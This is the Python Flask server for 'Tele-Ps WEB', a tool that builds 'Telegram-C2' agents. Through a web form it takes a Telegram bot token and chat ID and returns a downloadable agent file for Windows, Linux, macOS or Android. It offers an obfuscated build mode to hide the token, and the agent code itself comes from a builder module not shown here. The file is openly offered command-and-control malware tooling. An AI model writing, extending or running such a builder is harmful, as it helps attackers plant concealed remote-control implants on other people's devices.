#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#   Tele-Ps WEB - web-based Telegram-C2 agent builder
#   No IP / domain needed - only a Telegram bot.
#   Works on desktop + Android Termux.
#   Made by Abdelrahman
#   Run:  python3 server.py [--host 0.0.0.0] [--port 8080]
# ============================================================

import argparse
import os
import socket
import time
from pathlib import Path

from flask import Flask, jsonify, render_template_string, request, send_file

import builder as b

HERE = Path(__file__).resolve().parent
BUILDS = HERE / "builds"
BUILDS.mkdir(exist_ok=True)

IS_TERMUX = ("com.termux" in os.environ.get("HOME", "") or
             os.path.exists("/data/data/com.termux/files/usr/bin/bash"))

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = 2 * 1024 * 1024

PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Tele-Ps - Telegram C2 Builder</title>
<style>
  :root {
    --bg:#0a0e14; --panel:#111722; --line:#1f2937; --accent:#00e5a0;
    --accent2:#00b3ff; --danger:#ff5470; --text:#d7e0ea; --dim:#7a8794;
  }
  * { margin:0; padding:0; box-sizing:border-box; }
  body {
    font-family:"Segoe UI", system-ui, sans-serif; color:var(--text);
    background:
      radial-gradient(1200px 600px at 80% -10%, rgba(0,229,160,.08), transparent 60%),
      radial-gradient(900px 500px at 10% 110%, rgba(0,179,255,.07), transparent 60%),
      var(--bg);
    min-height:100vh; padding:76px 16px 40px; display:flex; align-items:center;
    justify-content:center;
  }
  .topbar {
    position:fixed; top:0; left:0; right:0; text-align:center; padding:12px;
    font-size:14px; letter-spacing:2px; color:var(--dim); z-index:20;
    background:rgba(13,19,32,.88); border-bottom:1px solid var(--line);
    backdrop-filter:blur(8px);
  }
  .topbar b { color:var(--accent); }
  .topbar .sep { color:var(--line); margin:0 10px; }
  .card {
    width:100%; max-width:560px; background:var(--panel);
    border:1px solid var(--line); border-radius:14px; padding:32px;
    box-shadow:0 20px 60px rgba(0,0,0,.45);
  }
  .logo { text-align:center; margin-bottom:8px; }
  .logo h1 {
    font-size:34px; letter-spacing:6px; font-weight:800;
    background:linear-gradient(90deg, var(--accent), var(--accent2));
    -webkit-background-clip:text; background-clip:text; color:transparent;
  }
  .logo p { color:var(--dim); font-size:13px; margin-top:6px; }
  .tag {
    display:inline-block; margin-top:14px; padding:4px 12px; font-size:12px;
    border:1px solid var(--line); border-radius:999px; color:var(--dim);
  }
  label { display:block; font-size:13px; color:var(--dim); margin:18px 0 6px; }
  input[type=text], select {
    width:100%; padding:12px 14px; font-size:14px; color:var(--text);
    background:#0d1320; border:1px solid var(--line); border-radius:8px;
    outline:none; transition:border .15s;
  }
  input[type=text]:focus, select:focus { border-color:var(--accent); }
  .row { display:flex; gap:12px; align-items:flex-end; }
  .row > div { flex:1; }
  .check { display:flex; align-items:center; gap:8px; margin:16px 0; font-size:13px; color:var(--dim); }
  .check input { accent-color:var(--accent); width:16px; height:16px; }
  button {
    width:100%; padding:14px; margin-top:10px; font-size:15px; font-weight:700;
    color:#04120d; background:linear-gradient(90deg, var(--accent), var(--accent2));
    border:none; border-radius:8px; cursor:pointer; transition:filter .15s;
  }
  button:hover { filter:brightness(1.1); }
  button:disabled { opacity:.5; cursor:wait; }
  .status { display:none; margin-top:18px; padding:14px; border-radius:8px; font-size:13px;
            white-space:pre-wrap; word-break:break-word; line-height:1.5; }
  .status.ok   { display:block; background:#06231c; border:1px solid #0d5c46; color:var(--accent); }
  .status.err  { display:block; background:#2a1218; border:1px solid #7a2330; color:var(--danger); }
  .status.info { display:block; background:#0d1a2b; border:1px solid #1e3a5f; color:var(--accent2); }
  .status a { color:var(--accent); font-weight:700; }
  .watermark {
    position:fixed; right:14px; bottom:10px; font-size:12px; color:var(--dim);
    opacity:.75; letter-spacing:1px; user-select:none; z-index:10;
  }
  .foot { text-align:center; color:var(--dim); font-size:12px; margin-top:22px; }
</style>
</head>
<body>
<div class="topbar"><b>Tele-Ps</b><span class="sep">&middot;</span>Tool Made by <b>Abdelrahman</b></div>
<div class="watermark">Made by Abdelrahman</div>
<div class="card">
  <div class="logo">
    <h1>Tele-Ps</h1>
    <p>Telegram-C2 agent builder &middot; no IP &middot; no domain &middot; no VPS</p>
    <span class="tag">Windows &middot; Linux &middot; macOS &middot; Android (Termux)</span>
  </div>

  <form id="frm">
    <label for="token">Telegram bot token (from @BotFather)</label>
    <input type="text" id="token" name="token" autocomplete="off" spellcheck="false"
           placeholder="123456789:AAxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" required>

    <label for="chat_id">Your Telegram chat ID (owner)</label>
    <input type="text" id="chat_id" name="chat_id" autocomplete="off" spellcheck="false"
           placeholder="123456789" required>

    <div class="row">
      <div>
        <label for="mode">Build mode</label>
        <select id="mode" name="mode">
          <option value="plain">Plain (readable)</option>
          <option value="obf">Obfuscated (hides token)</option>
        </select>
      </div>
      <div>
        <label for="name">Output name (optional)</label>
        <input type="text" id="name" name="name" placeholder="teleps_agent.py">
      </div>
    </div>

    <div class="check">
      <input type="checkbox" id="test" name="test" checked>
      <label for="test" style="margin:0">Test credentials with Telegram before building</label>
    </div>

    <button type="submit" id="btn">BUILD AGENT</button>
  </form>

  <div class="status" id="status"></div>
  <div class="foot">Generated agents are saved in <b>builds/</b></div>
</div>

<script>
const $ = id => document.getElementById(id);
$('frm').addEventListener('submit', async e => {
  e.preventDefault();
  const st = $('status'), btn = $('btn');
  st.className = 'status info'; st.textContent = '[+] Building ...';
  btn.disabled = true; btn.textContent = 'BUILDING ...';
  try {
    const r = await fetch('/build', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        token: $('token').value.trim(),
        chat_id: $('chat_id').value.trim(),
        mode: $('mode').value,
        name: $('name').value.trim(),
        test: $('test').checked
      })
    });
    const j = await r.json();
    if (!r.ok || !j.ok) { st.className = 'status err'; st.textContent = '[-] ' + (j.error || 'build failed'); return; }
    st.className = 'status ok';
    st.textContent = j.message + '\n\nDownload: ' + j.download;
    st.innerHTML = st.textContent.replace(j.download, '<a href="' + j.download + '">' + j.download + '</a>');
  } catch (err) {
    st.className = 'status err'; st.textContent = '[-] Request failed: ' + err;
  } finally {
    btn.disabled = false; btn.textContent = 'BUILD AGENT';
  }
});
</script>
</body>
</html>"""


def lan_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return None


@app.get("/")
def index():
    return render_template_string(PAGE)


@app.post("/build")
def build():
    data = request.get_json(silent=True) or {}
    token = (data.get("token") or "").strip()
    chat_id = (data.get("chat_id") or "").strip()
    mode = (data.get("mode") or "plain").strip()
    name = (data.get("name") or "").strip()
    do_test = bool(data.get("test", True))

    if not b.validate_token(token):
        return jsonify(ok=False, error="Invalid bot token format (expected 123456789:AA...)."), 400
    if not b.validate_chat_id(chat_id):
        return jsonify(ok=False, error="Invalid chat ID (must be a number)."), 400

    if do_test:
        ok = b.test_token(token, chat_id)
        if not ok:
            return jsonify(ok=False, error="Credentials failed validation against Telegram."), 400

    if not name or not name.endswith(".py"):
        name = "teleps_agent_%s.py" % time.strftime("%Y%m%d_%H%M%S")
    name = os.path.basename(name)

    try:
        if mode == "obf":
            out = b.build_obfuscated(token, chat_id, out_name=name)
        else:
            out = b.build(token, chat_id, out_name=name)
    except Exception as e:
        return jsonify(ok=False, error="Build error: %s" % e), 500

    return jsonify(
        ok=True,
        message="[+] Agent built successfully.\nFile: %s" % name,
        download="/download/%s" % name,
    )


@app.get("/download/<path:name>")
def download(name):
    path = BUILDS / os.path.basename(name)
    if not path.is_file():
        return "not found", 404
    return send_file(path, as_attachment=True, download_name=path.name)


def main():
    ap = argparse.ArgumentParser(description="Tele-Ps web builder - Made by Abdelrahman")
    ap.add_argument("--host", default="127.0.0.1",
                    help="bind address (use 0.0.0.0 to allow LAN access)")
    ap.add_argument("--port", type=int, default=8080)
    args = ap.parse_args()

    print("==========================================")
    print("  Tele-Ps WEB  |  Tool Made by Abdelrahman")
    print("==========================================")
    if IS_TERMUX:
        print("[*] Termux detected - agent will auto-detect Android")
    print("[*] Local:  http://127.0.0.1:%d" % args.port)
    if args.host in ("0.0.0.0", "::"):
        ip = lan_ip()
        if ip:
            print("[*] LAN:    http://%s:%d  (other devices on your network)" % (ip, args.port))
    print("[*] Press Ctrl+C to stop")
    app.run(host=args.host, port=args.port, debug=False)


if __name__ == "__main__":
    main()
